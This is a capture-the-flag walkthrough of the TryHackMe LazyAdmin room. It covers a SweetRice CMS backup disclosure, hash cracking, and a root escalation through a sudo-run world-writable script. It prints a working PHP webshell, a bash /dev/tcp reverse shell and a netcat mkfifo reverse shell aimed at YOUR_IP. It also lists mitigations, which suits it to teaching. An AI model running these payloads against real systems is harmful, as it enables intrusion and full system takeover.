---
title: "TryHackMe: LazyAdmin"
description: "Walkthrough of TryHackMe LazyAdmin - exploiting SweetRice CMS backup disclosure to obtain admin credentials, uploading a PHP webshell via the ads feature, and escalating to root through a writable shell script executed via sudo."
date: 2025-12-26
categories: [TryHackMe]
tags: [ctf, tryhackme, easy, sweetrice, cms, file-upload, sudo, webshell, php, reverse-shell]
image:
  path: /assets/img/tryhackme/2025/lazyadmin/cover.jpeg
  alt: TryHackMe LazyAdmin Room
---

## Overview

| Property | Value |
|----------|-------|
| Room | [LazyAdmin](https://tryhackme.com/room/lazyadmin) |
| Difficulty | Easy |
| OS | Linux (Ubuntu) |
| Attack Chain | `www-data → root` |

An easy Linux machine showcasing common web application vulnerabilities. We discovered **SweetRice CMS** through directory enumeration, exploited a **backup disclosure vulnerability** to obtain admin credentials from an exposed MySQL backup file, uploaded a **PHP webshell** through the ads feature, and escalated to root by modifying a **world-writable script** that was executed via sudo.

### Tools Used

| Phase | Tool | Purpose |
|-------|------|---------|
| Recon | nmap | Port scanning and service enumeration |
| Enum | ffuf | Directory brute forcing |
| Exploit | Browser | Webshell upload via CMS admin panel |
| Exploit | nc (netcat) | Reverse shell listener |
| Privesc | sudo | Privilege escalation via perl script |

---

## Reconnaissance

We begin with a comprehensive port scan to identify all running services.

```console
$ nmap -sC -sV -Pn -p- 10.81.156.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-26 23:12 EET
Nmap scan report for 10.81.156.4
Host is up (0.059s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports are open:
- **Port 22**: OpenSSH 7.2p2 - Standard SSH service
- **Port 80**: Apache 2.4.18 - Shows default Ubuntu page

> **Key Finding:** The default Apache page suggests there may be hidden web applications or directories that need to be discovered through enumeration.
{: .prompt-info }

---

## Enumeration

### Directory Enumeration

The default Apache page doesn't reveal much. Let's enumerate hidden directories using ffuf:

```console
$ ffuf -u http://10.81.156.4/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302,403

content                 [Status: 301, Size: 312, Words: 20, Lines: 10]
```

Found `/content` directory. Further enumeration reveals the CMS structure:

```console
$ ffuf -u http://10.81.156.4/content/FUZZ -w directory-list-2.3-medium.txt -mc 200,301,302,403

images                  [Status: 301]
js                      [Status: 301]
inc                     [Status: 301]
as                      [Status: 301]
_themes                 [Status: 301]
attachment              [Status: 301]
```

### Identifying the CMS

Visiting `/content/` reveals **SweetRice CMS**:

![SweetRice CMS Homepage](/assets/img/tryhackme/2025/lazyadmin/sweetrice-homepage.png)
_SweetRice CMS - Site under construction message_

### Searching for Known Exploits

```console
$ searchsploit sweetrice
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
SweetRice 1.5.1 - Arbitrary File Download     | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload       | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure           | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery  | php/webapps/40700.html
---------------------------------------------- ---------------------------------
```

Multiple vulnerabilities exist for SweetRice 1.5.1. The **Backup Disclosure** vulnerability is particularly interesting.

### Exploiting Backup Disclosure

According to the exploit, MySQL backups are accessible at `/content/inc/mysql_backup/`:

![MySQL Backup Directory](/assets/img/tryhackme/2025/lazyadmin/mysql-backup-dir.png)
_Exposed MySQL backup file in the inc directory_

Downloading and analyzing the backup reveals admin credentials:

```php
INSERT INTO `%--%_options` VALUES('1','global_setting','a:17:{
  s:5:"admin";s:7:"manager";
  s:6:"passwd";s:32:"[REDACTED]";
  ...
```

Extracted credentials:
- **Username**: `manager`
- **Password Hash**: `[REDACTED]` (MD5)

Using [CrackStation](https://crackstation.net/), the MD5 hash cracks to: `[REDACTED]`

> **Vulnerability Discovered:** The backup disclosure vulnerability exposes admin credentials without any authentication. Database backups should never be accessible from the web.
{: .prompt-danger }

---

## Initial Access - www-data

### Admin Panel Login

The admin panel is located at `/content/as/`. We successfully login with the cracked credentials:

![SweetRice Login Panel](/assets/img/tryhackme/2025/lazyadmin/admin-login.png)
_SweetRice CMS admin login panel_

![Admin Dashboard](/assets/img/tryhackme/2025/lazyadmin/admin-dashboard.png)
_Successfully logged in as manager_

### PHP Code Execution via Ads Feature

SweetRice allows admins to add code in the **Ads** section, which gets saved as `.php` files in `/content/inc/ads/`. This is documented in CVE-related exploit 40700.

Navigate to **Ads** in the admin panel:

![Ads Panel](/assets/img/tryhackme/2025/lazyadmin/ads-panel.png)
_Ads management panel in SweetRice_

Create a new ad with a PHP webshell payload:

- **Ads name**: `shell`
- **Ads code**: `<?php system($_GET["cmd"]); ?>`

![Webshell Upload](/assets/img/tryhackme/2025/lazyadmin/webshell-upload.png)
_Uploading PHP webshell via the Ads feature_

After clicking **Done**, the webshell is saved and accessible at `/content/inc/ads/shell.php`.

> **Vulnerability Discovered:** The CMS allows admins to inject arbitrary PHP code through the ads feature, which is stored and executed as PHP files.
{: .prompt-danger }

### Establishing a Reverse Shell

Instead of using blind webshell commands, let's get a proper reverse shell. Start a listener on your machine:

```console
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
```

Trigger a bash reverse shell through the webshell:

```console
$ curl -G "http://10.81.156.4/content/inc/ads/shell.php" \
  --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'
```

We receive a connection:

```console
Connection received on 10.81.156.4 37566
bash: cannot set terminal process group (1047): Inappropriate ioctl for device
bash: no job control in this shell
www-data@THM-Chal:/var/www/html/content/inc/ads$
```

### Shell Stabilization

Upgrade to a fully interactive TTY:

```console
www-data@THM-Chal:/var/www/html/content/inc/ads$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@THM-Chal:/var/www/html/content/inc/ads$ export TERM=xterm
www-data@THM-Chal:/var/www/html/content/inc/ads$ export SHELL=/bin/bash
```

### System Enumeration

```console
www-data@THM-Chal:/var/www/html/content/inc/ads$ whoami
www-data
www-data@THM-Chal:/var/www/html/content/inc/ads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@THM-Chal:/var/www/html/content/inc/ads$ hostname
THM-Chal
```

### User Flag

Exploring the home directories:

```console
www-data@THM-Chal:/var/www/html/content/inc/ads$ ls -la /home/
total 12
drwxr-xr-x  3 root  root  4096 Nov 29  2019 .
drwxr-xr-x 23 root  root  4096 Nov 29  2019 ..
drwxr-xr-x 18 itguy itguy 4096 Nov 30  2019 itguy
www-data@THM-Chal:/var/www/html/content/inc/ads$ ls -la /home/itguy/
total 148
drwxr-xr-x 18 itguy itguy 4096 Nov 30  2019 .
drwxr-xr-x  3 root  root  4096 Nov 29  2019 ..
-rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl
-rw-rw-r--  1 itguy itguy   16 Nov 29  2019 mysql_login.txt
-rw-rw-r--  1 itguy itguy   38 Nov 29  2019 user.txt
...
www-data@THM-Chal:/var/www/html/content/inc/ads$ cat /home/itguy/user.txt
THM{[REDACTED]}
```

---

## Privilege Escalation - Root

### Sudo Enumeration

Checking sudo privileges for www-data:

```console
www-data@THM-Chal:/var/www/html/content/inc/ads$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

www-data can run `/usr/bin/perl /home/itguy/backup.pl` as root without a password.

### Analyzing the Perl Script

```console
www-data@THM-Chal:/var/www/html/content/inc/ads$ cat /home/itguy/backup.pl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

The Perl script executes `/etc/copy.sh` using `/bin/sh`. Let's check the permissions:

```console
www-data@THM-Chal:/var/www/html/content/inc/ads$ ls -la /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

> **Vulnerability Discovered:** The `/etc/copy.sh` script is **world-writable** (`-rw-r--rwx`). Since it's executed as root via the sudo-allowed Perl script, we can modify it to execute arbitrary commands as root.
{: .prompt-danger }

### Exploiting the World-Writable Script

The attack chain is:
1. Modify `/etc/copy.sh` with a reverse shell payload
2. Start a listener on our machine
3. Run `sudo /usr/bin/perl /home/itguy/backup.pl`
4. Receive root shell

> **Note:** The script is executed with `/bin/sh`, which on Ubuntu is `dash`. Bash-specific syntax like `/dev/tcp` won't work - we need to use netcat instead.
{: .prompt-warning }

Start a listener on a new port:

```console
$ nc -lvnp 5555
Listening on 0.0.0.0 5555
```

Overwrite copy.sh with a netcat reverse shell and trigger:

```console
www-data@THM-Chal:/var/www/html/content/inc/ads$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 5555 >/tmp/f' > /etc/copy.sh
www-data@THM-Chal:/var/www/html/content/inc/ads$ sudo /usr/bin/perl /home/itguy/backup.pl
```

### Root Flag

We receive a root shell on our listener:

```console
Connection received on 10.81.156.4 44806
# whoami
root
# ls /root/
root.txt
# cat /root/root.txt
THM{[REDACTED]}
```

---

## Key Takeaways

### Vulnerabilities Exploited

| Vulnerability | Impact | Mitigation |
|--------------|--------|------------|
| Backup Disclosure | Admin credential exposure | Restrict access to backup directories, store backups outside webroot |
| Weak Password | Easy to crack MD5 hash | Use strong, unique passwords with proper hashing (bcrypt) |
| PHP Code Injection | Remote code execution | Sanitize user input, disable PHP execution in upload directories |
| World-writable script | Privilege escalation | Set proper file permissions (chmod 755), never make scripts world-writable |
| Overprivileged sudo | Root access | Restrict sudo to specific, safe commands |

### Attack Chain Summary

```
Directory Enumeration → SweetRice CMS
         ↓
Backup Disclosure → Admin Credentials
         ↓
PHP Webshell via Ads → RCE as www-data
         ↓
World-writable /etc/copy.sh + sudo perl → Root
```

### Security Anti-Patterns Observed

1. **Exposed Database Backups** - MySQL backup files accessible without authentication
2. **Weak Password Storage** - MD5 hash easily cracked with online tools
3. **Dangerous CMS Feature** - Ads feature allows arbitrary PHP code execution
4. **World-Writable System Script** - Critical script writable by any user
5. **Overprivileged Sudo Rule** - Allows indirect command execution as root

### Skills Practiced

- Web application enumeration
- CMS vulnerability exploitation
- Backup disclosure attacks
- MD5 hash cracking
- PHP webshell deployment
- Reverse shell techniques (bash, netcat)
- Shell stabilization (Python PTY)
- Sudo privilege escalation
- Script injection attacks

---

## References

- [SweetRice CMS Exploits - Exploit-DB](https://www.exploit-db.com/search?q=sweetrice)
- [CrackStation - Online Hash Cracking](https://crackstation.net/)
- [GTFOBins - Perl](https://gtfobins.github.io/gtfobins/perl/)
- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

